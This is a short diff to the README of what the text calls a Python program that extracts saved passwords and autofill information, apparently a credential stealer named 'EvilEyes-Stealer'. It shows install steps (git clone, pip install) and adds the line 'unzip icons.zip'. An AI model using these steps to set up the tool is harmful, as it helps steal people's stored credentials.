@@ -22,6 +22,7 @@ This is a Python program that extracts saved passwords and autofill information 
 git clone https://github.com/capture0x/EvilEyes-Stealer
 cd EvilEyes-Stealer
 pip3 install -r requirements.txt
+unzip icons.zip
 ```
 ## Usage
 
